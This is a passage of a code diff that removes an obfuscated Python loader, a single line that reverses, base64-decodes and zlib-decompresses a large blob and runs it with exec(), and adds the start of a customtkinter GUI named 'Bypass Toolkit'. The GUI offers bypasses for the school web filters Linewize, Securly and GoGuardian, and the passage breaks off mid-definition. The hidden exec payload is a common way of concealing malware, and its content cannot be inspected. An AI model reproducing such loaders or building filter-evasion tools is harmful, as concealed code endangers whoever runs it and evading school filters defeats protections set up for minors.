@@ -1,2 +1,496 @@
+import customtkinter as ctk
+import webbrowser
+from urllib.parse import quote
+import time
+import threading
+from typing import List, Tuple
 
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+class BypassApp(ctk.CTk):
+    def __init__(self):
+        super().__init__()
+        
+        # Configure window
+        self.title("Bypass Toolkit")
+        self.geometry("950x650")
+        self.resizable(True, True)
+        self.configure(fg_color="black")
+        
+        # Remove default title bar
+        self.overrideredirect(True)
+        
+        # Center window on screen
+        self.center_window()
+        
+        # Set theme
+        ctk.set_appearance_mode("dark")
+        
+        # Variables for dragging
+        self.x = 0
+        self.y = 0
+        
+        # Create loading screen first
+        self.create_loading_screen()
+        
+        # Show loading animation
+        self.animate_loading()
+        
+    def center_window(self):
+        self.update_idletasks()
+        width = self.winfo_width()
+        height = self.winfo_height()
+        x = (self.winfo_screenwidth() // 2) - (width // 2)
+        y = (self.winfo_screenheight() // 2) - (height // 2)
+        self.geometry(f"{width}x{height}+{x}+{y}")
+    
+    def create_loading_screen(self):
+        # Loading screen frame
+        self.loading_frame = ctk.CTkFrame(
+            self,
+            fg_color="#0f0f1a",
+            corner_radius=0
+        )
+        self.loading_frame.place(relwidth=1, relheight=1)
+        
+        # Loading content
+        loading_content = ctk.CTkFrame(
+            self.loading_frame,
+            fg_color="transparent"
+        )
+        loading_content.place(relx=0.5, rely=0.5, anchor="center")
+        
+        # Animated logo
+        self.loading_logo = ctk.CTkLabel(
+            loading_content,
+            text="🚀",
+            font=ctk.CTkFont(size=80, weight="bold"),
+            text_color="#667eea"
+        )
+        self.loading_logo.pack(pady=20)
+        
+        # Loading text
+        self.loading_text = ctk.CTkLabel(
+            loading_content,
+            text="Bypass Toolkit",
+            font=ctk.CTkFont(size=36, weight="bold"),
+            text_color="white"
+        )
+        self.loading_text.pack(pady=10)
+        
+        # Loading bar
+        self.loading_bar = ctk.CTkProgressBar(
+            loading_content,
+            width=300,
+            height=4,
+            progress_color="#667eea",
+            fg_color="gray20"
+        )
+        self.loading_bar.pack(pady=20)
+        self.loading_bar.set(0)
+        
+        # Loading subtitle
+        self.loading_subtitle = ctk.CTkLabel(
+            loading_content,
+            text="Initializing secure bypass protocols...",
+            font=ctk.CTkFont(size=14),
+            text_color="gray70"
+        )
+        self.loading_subtitle.pack(pady=10)
+    
+    def animate_loading(self):
+        def loading_animation():
+            # Animate progress bar
+            for i in range(101):
+                self.loading_bar.set(i/100)
+                time.sleep(0.02)
+                if i == 30:
+                    self.loading_subtitle.configure(text="Loading GUI components...")
+                elif i == 60:
+                    self.loading_subtitle.configure(text="Initializing bypass methods...")
+                elif i == 80:
+                    self.loading_subtitle.configure(text="Almost ready...")
+            
+            # Fade out loading screen
+            time.sleep(0.5)
+            self.loading_frame.place_forget()
+            
+            # Create main GUI
+            self.create_main_gui()
+            self.animate_main_gui()
+        
+        threading.Thread(target=loading_animation, daemon=True).start()
+    
+    def create_main_gui(self):
+        # Main container with glass effect
+        self.main_container = ctk.CTkFrame(
+            self,
+            fg_color="#0f0f1a",
+            corner_radius=20,
+            border_width=1,
+            border_color="gray30"
+        )
+        self.main_container.place(relwidth=0.98, relheight=0.98, relx=0.01, rely=0.01)
+        
+        # Create custom title bar
+        self.create_title_bar()
+        
+        # Create main content
+        self.create_main_content()
+    
+    def create_title_bar(self):
+        # Title bar frame
+        title_bar = ctk.CTkFrame(
+            self.main_container,
+            fg_color="transparent",
+            height=50,
+            corner_radius=0
+        )
+        title_bar.pack(fill="x", padx=0, pady=0)
+        title_bar.pack_propagate(False)
+        
+        # Bind dragging events
+        title_bar.bind("<ButtonPress-1>", self.start_move)
+        title_bar.bind("<ButtonRelease-1>", self.stop_move)
+        title_bar.bind("<B1-Motion>", self.do_move)
+        
+        # Title
+        title_label = ctk.CTkLabel(
+            title_bar,
+            text="🚀 Bypass Toolkit",
+            font=ctk.CTkFont(size=18, weight="bold"),
+            text_color="#667eea"
+        )
+        title_label.pack(side="left", padx=20, pady=15)
+        title_label.bind("<ButtonPress-1>", self.start_move)
+        title_label.bind("<B1-Motion>", self.do_move)
+        
+        # Window controls
+        controls_frame = ctk.CTkFrame(
+            title_bar,
+            fg_color="transparent"
+        )
+        controls_frame.pack(side="right", padx=10, pady=10)
+        
+        # Minimize button
+        minimize_btn = ctk.CTkButton(
+            controls_frame,
+            text="─",
+            width=30,
+            height=30,
+            fg_color="gray20",
+            hover_color="gray30",
+            text_color="white",
+            font=ctk.CTkFont(size=16, weight="bold"),
+            command=self.minimize_window,
+            corner_radius=8
+        )
+        minimize_btn.pack(side="left", padx=5)
+        
+        # Close button
+        close_btn = ctk.CTkButton(
+            controls_frame,
+            text="×",
+            width=30,
+            height=30,
+            fg_color="gray20",
+            hover_color="#e74c3c",
+            text_color="white",
+            font=ctk.CTkFont(size=16, weight="bold"),
+            command=self.quit_app,
+            corner_radius=8
+        )
+        close_btn.pack(side="left", padx=5)
+    
+    def create_main_content(self):
+        # Main content frame
+        content_frame = ctk.CTkFrame(
+            self.main_container,
+            fg_color="transparent"
+        )
+        content_frame.pack(fill="both", expand=True, padx=20, pady=20)
+        
+        # Create sidebar and main area
+        self.create_sidebar(content_frame)
+        self.create_main_area(content_frame)
+    
+    def create_sidebar(self, parent):
+        # Sidebar frame
+        sidebar = ctk.CTkFrame(
+            parent,
+            fg_color="#151522",
+            width=250,
+            corner_radius=15
+        )
+        sidebar.pack(side="left", fill="y", padx=(0, 20))
+        sidebar.pack_propagate(False)
+        
+        # Navigation items
+        nav_items = [
+            ("🔓", "Bypasses", "bypasses"),
+            ("🛠️", "Tools", "tools"), 
+            ("⚙️", "Settings", "settings")
+        ]
+        
+        for icon, text, section in nav_items:
+            item = ctk.CTkButton(
+                sidebar,
+                text=f"   {icon}  {text}",
+                font=ctk.CTkFont(size=14, weight="bold"),
+                fg_color="transparent",
+                hover_color="#1e1e2d",
+                anchor="w",
+                height=45,
+                corner_radius=10
+            )
+            item.pack(fill="x", padx=15, pady=5)
+        
+        # Sub-items for bypasses
+        sub_items = [
+            ("🌐", "Linewize", "linewize"),
+            ("🛡️", "Securly", "securly"),
+            ("🔒", "GoGuardian", "goguardian")
+        ]
+        
+        sub_frame = ctk.CTkFrame(sidebar, fg_color="transparent")
+        sub_frame.pack(fill="x", padx=25, pady=10)
+        
+        for icon, text, subsection in sub_items:
+            sub_item = ctk.CTkButton(
+                sub_frame,
+                text=f"   {icon}  {text}",
+                font=ctk.CTkFont(size=12),
+                fg_color="transparent",
+                hover_color="#1a1a28",
+                anchor="w",
